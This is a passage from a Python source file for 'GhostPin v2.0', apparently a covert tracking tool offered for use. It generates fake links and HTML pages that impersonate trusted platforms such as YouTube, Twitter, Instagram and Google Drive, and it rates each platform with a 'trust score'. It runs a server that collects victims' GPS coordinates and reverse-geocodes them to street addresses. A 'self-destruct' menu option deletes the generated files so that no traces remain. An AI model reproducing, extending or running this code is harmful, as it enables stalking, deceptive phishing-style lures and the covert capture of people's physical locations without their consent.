                        token = '/'.join(match.groups())
                        break
                
                if not platform:
                    # Try to guess platform
                    for plat in self.platforms.PLATFORMS:
                        if plat in url.lower():
                            platform = plat
                            break
                
                if not platform:
                    platform = 'generic'
                
                if not token:
                    token = hashlib.md5(url.encode()).hexdigest()[:8]
                
                # Generate tracking URL
                tracking_url = f"http://localhost:{self.server.server_thread.port if self.server.server_thread else 8080}/track/{token}" if self.server.running else f"http://localhost:8080/track/{token}"
                
                # Generate HTML
                html = self.engine.generate(platform, token, tracking_url)
                
                result = {
                    'platform': platform,
                    'token': token,
                    'original_url': url,
                    'ghost_url': self._generate_ghost_url(platform, token),
                    'tracking_url': tracking_url,
                    'html': html,
                    'timestamp': datetime.now().isoformat()
                }
                
                self.generated_links.append(result)
                
                cprint(f"\n[+] Platform: {platform}", Colors.CYAN)
                cprint(f"[+] Ghost Link: {Colors.GREEN}{result['ghost_url']}{Colors.WHITE}", Colors.GREEN)
                cprint(f"[+] Tracking Endpoint: {Colors.YELLOW}{result['tracking_url']}{Colors.WHITE}", Colors.YELLOW)
                cprint(f"[+] Trust Score: {Colors.GOLD}{self.platforms.PLATFORMS.get(platform, {}).get('trust_score', 5)}/10{Colors.WHITE}", Colors.WHITE)
                
                # Save HTML to file
                filename = f"ghost_{platform}_{token[:8]}.html"
                with open(filename, 'w') as f:
                    f.write(html)
                cprint(f"[+] HTML saved to {Colors.BLUE}{filename}{Colors.WHITE}", Colors.WHITE)
                
            elif choice == '2':
                cprint("\nAvailable platforms:", Colors.CYAN)
                for plat in sorted(self.platforms.PLATFORMS.keys()):
                    trust = self.platforms.PLATFORMS[plat].get('trust_score', 5)
                    cprint(f"  {Colors.GREEN}{plat}{Colors.WHITE} (Trust: {trust}/10)", Colors.WHITE)
                
                platform = input("\n[>] Platform: ").strip().lower()
                token = input("[>] Token/ID: ").strip()
                
                if platform not in self.platforms.PLATFORMS:
                    cprint("[-] Unknown platform", Colors.RED)
                    continue
                
                # Generate tracking URL
                tracking_url = f"http://localhost:{self.server.server_thread.port if self.server.server_thread else 8080}/track/{token}" if self.server.running else f"http://localhost:8080/track/{token}"
                
                # Generate HTML
                html = self.engine.generate(platform, token, tracking_url)
                
                result = {
                    'platform': platform,
                    'token': token,
                    'ghost_url': self._generate_ghost_url(platform, token),
                    'tracking_url': tracking_url,
                    'html': html,
                    'timestamp': datetime.now().isoformat()
                }
                
                self.generated_links.append(result)
                
                cprint(f"\n[+] Ghost Link: {Colors.GREEN}{result['ghost_url']}{Colors.WHITE}", Colors.GREEN)
                cprint(f"[+] Tracking Endpoint: {Colors.YELLOW}{result['tracking_url']}{Colors.WHITE}", Colors.YELLOW)
                
                filename = f"ghost_{platform}_{token[:8]}.html"
                with open(filename, 'w') as f:
                    f.write(html)
                cprint(f"[+] HTML saved to {Colors.BLUE}{filename}{Colors.WHITE}", Colors.WHITE)
                
            elif choice == '3':
                port = int(input("[>] Port (8080): ").strip() or "8080")
                
                if self.server.running:
                    cprint("[!] Server already running", Colors.YELLOW)
                    continue
                
                cprint("[*] Starting tracking server...", Colors.BLUE)
                self.server.start(port)
                
            elif choice == '4':
                data = self.server.get_data()
                
                if not data:
                    cprint("[!] No tracking data yet", Colors.YELLOW)
                    continue
                
                cprint(f"\n[+] Live Tracking Data ({len(data)} records):", Colors.GREEN)
                for i, record in enumerate(data[-10:], 1):
                    lat = record.get('lat', 'N/A')
                    lng = record.get('lng', 'N/A')
                    token = record.get('token', 'N/A')
                    timestamp = record.get('received_at', record.get('timestamp', 'N/A'))
                    
                    cprint(f"\n  [{i}] Token: {Colors.CYAN}{token}{Colors.WHITE}", Colors.WHITE)
                    cprint(f"      Location: {Colors.GOLD}{lat}, {lng}{Colors.WHITE}", Colors.WHITE)
                    cprint(f"      Time: {Colors.DIM}{timestamp}{Colors.WHITE}", Colors.WHITE)
                    
                    if lat != 'N/A' and lng != 'N/A':
                        maps_link = f"https://www.google.com/maps?q={lat},{lng}"
                        cprint(f"      Map: {Colors.BLUE}{maps_link}{Colors.WHITE}", Colors.WHITE)
                        
                        # Try reverse geocoding
                        try:
                            if REQUESTS_AVAILABLE:
                                geo_url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lng}"
                                response = requests.get(geo_url, timeout=5)
                                if response.status_code == 200:
                                    geo_data = response.json()
                                    if 'display_name' in geo_data:
                                        cprint(f"      Address: {Colors.PURPLE}{geo_data['display_name'][:100]}{Colors.WHITE}", Colors.WHITE)
                        except:
                            pass
                
            elif choice == '5':
                lat = input("[>] Latitude: ").strip()
                lng = input("[>] Longitude: ").strip()
                
                if lat and lng:
                    maps_link = f"https://www.google.com/maps?q={lat},{lng}"
                    cprint(f"\n[+] Google Maps: {Colors.GREEN}{maps_link}{Colors.WHITE}", Colors.GREEN)
                    
                    try:
                        if REQUESTS_AVAILABLE:
                            geo_url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lng}"
                            response = requests.get(geo_url, timeout=5)
                            if response.status_code == 200:
                                geo_data = response.json()
                                if 'display_name' in geo_data:
                                    cprint(f"[+] Address: {Colors.CYAN}{geo_data['display_name']}{Colors.WHITE}", Colors.WHITE)
                    except:
                        pass
                
            elif choice == '6':
                if not self.generated_links:
                    cprint("[!] No generated links", Colors.YELLOW)
                    continue
                
                cprint(f"\n[+] Generated Links ({len(self.generated_links)}):", Colors.GREEN)
                for i, link in enumerate(self.generated_links, 1):
                    cprint(f"  {i}. {Colors.CYAN}{link['platform']}{Colors.WHITE}", Colors.WHITE)
                    cprint(f"     Ghost: {Colors.GREEN}{link['ghost_url']}{Colors.WHITE}", Colors.WHITE)
                    cprint(f"     Token: {Colors.DIM}{link['token']}{Colors.WHITE}", Colors.WHITE)
                    cprint(f"     Time: {Colors.DIM}{link['timestamp']}{Colors.WHITE}", Colors.WHITE)
                
            elif choice == '7':
                cprint("[*] Clearing all data...", Colors.RED)
                self.server.clear_data()
                self.generated_links = []
                self.results = {}
                cprint("[+] All data cleared", Colors.GREEN)
                
            elif choice == '8':
                cprint("[*] Self-destruct sequence initiated", Colors.RED)
                cprint("[*] Deleting all traces...", Colors.RED)
                self.server.clear_data()
                self.generated_links = []
                self.results = {}
                
                # Delete generated HTML files
                for f in os.listdir('.'):
                    if f.startswith('ghost_') and f.endswith('.html'):
                        try:
                            os.remove(f)
                        except:
                            pass
                
                cprint("[+] All traces deleted", Colors.GREEN)
                cprint("[*] GhostPin has vanished", Colors.RED)
                cprint("[*] You are now invisible", Colors.PURPLE)
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)
    
    def _generate_ghost_url(self, platform: str, token: str) -> str:
        """Generate a ghost URL for the platform"""
        info = self.platforms.PLATFORMS.get(platform, {})
        template = info.get('template', 'https://{platform}.com/{token}')
        
        # Handle templates with multiple placeholders
        if '{user}' in template and '{id}' in template:
            # Split token for platforms like Twitter
            parts = token.split('/')
            if len(parts) >= 2:
                return template.format(user=parts[0], id=parts[1])
        
        return template.format(token=token)

# ============================[ MAIN ]================================

def main():
    parser = argparse.ArgumentParser(
        description="GhostPin v2.0 - The Unshackled Beast",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
EXAMPLES:
  python3 ghostpin.py -p youtube -t abc123xyz
  python3 ghostpin.py -u "https://www.youtube.com/watch?v=abc123xyz"
  python3 ghostpin.py -p twitter -t username/status/1234567890123456789
  python3 ghostpin.py --server --port 8080
  python3 ghostpin.py -p youtube -t abc123xyz -o link.html
        """
    )
    
    parser.add_argument("-p", "--platform", help="Platform (youtube/twitter/instagram/facebook/linkedin/github/medium/reddit/spotify/soundcloud/tiktok/dropbox/google_drive/docs)")
    parser.add_argument("-t", "--token", help="Token or ID")
    parser.add_argument("-u", "--url", help="Full URL to parse")
    parser.add_argument("--server", action="store_true", help="Start tracking server")
    parser.add_argument("--port", type=int, default=8080, help="Server port")
    parser.add_argument("-o", "--output", help="Output HTML file")
    
    args = parser.parse_args()
    
    if args.server:
        print_banner()
        server = GhostServerEngine()
        server.start(args.port)
        
        cprint("\n[!] Press Ctrl+C to stop server", Colors.YELLOW)
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            server.stop()
            cprint("\n[+] Server stopped", Colors.GREEN)
        sys.exit(0)
    
    if args.url:
        print_banner()
        platforms = TrustedPlatforms()
        generator = RealisticHTMLGenerator()
        
        platform = None
        token = None
        
        for plat, info in platforms.PLATFORMS.items():
            match = re.search(info['pattern'], args.url)
            if match:
                platform = plat
                token = '/'.join(match.groups())
                break
        
        if not platform:
            for plat in platforms.PLATFORMS:
                if plat in args.url.lower():
                    platform = plat
                    break
        
        if not platform:
            platform = 'generic'
        
        if not token:
            token = hashlib.md5(args.url.encode()).hexdigest()[:8]
        
        tracking_url = f"http://localhost:8080/track/{token}"
        html = generator.generate(platform, token, tracking_url)
        
        result = {
            'platform': platform,
            'token': token,
            'ghost_url': f"https://{platform}.com/{token}" if platform != 'generic' else f"https://{platform}.com/{token}",
            'html': html,
            'timestamp': datetime.now().isoformat()
        }
        
        print(json.dumps(result, indent=2))
        
        if args.output:
            with open(args.output, 'w') as f:
                f.write(html)
            cprint(f"[+] HTML saved to {args.output}", Colors.GREEN)
        
        cprint(f"\n[+] Ghost Link: {Colors.GREEN}{result['ghost_url']}{Colors.WHITE}", Colors.GREEN)
        sys.exit(0)
    
    if args.platform and args.token:
        print_banner()
        platforms = TrustedPlatforms()
        generator = RealisticHTMLGenerator()
        
        tracking_url = f"http://localhost:8080/track/{args.token}"
        html = generator.generate(args.platform, args.token, tracking_url)
        
        result = {
            'platform': args.platform,
            'token': args.token,
            'ghost_url': f"https://{args.platform}.com/{args.token}",
            'html': html,
            'timestamp': datetime.now().isoformat()
        }
        
        print(json.dumps(result, indent=2))
        
        if args.output:
            with open(args.output, 'w') as f:
                f.write(html)
            cprint(f"[+] HTML saved to {args.output}", Colors.GREEN)
        
        cprint(f"\n[+] Ghost Link: {Colors.GREEN}{result['ghost_url']}{Colors.WHITE}", Colors.GREEN)
        sys.exit(0)
    
    # Interactive mode
    tool = GhostPinV2()
    tool.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] GhostPin has vanished", Colors.RED)
        sys.exit(0)
    except Exception as e:
        cprint(f"\n[!] Error: {e}", Colors.RED)
        sys.exit(1)
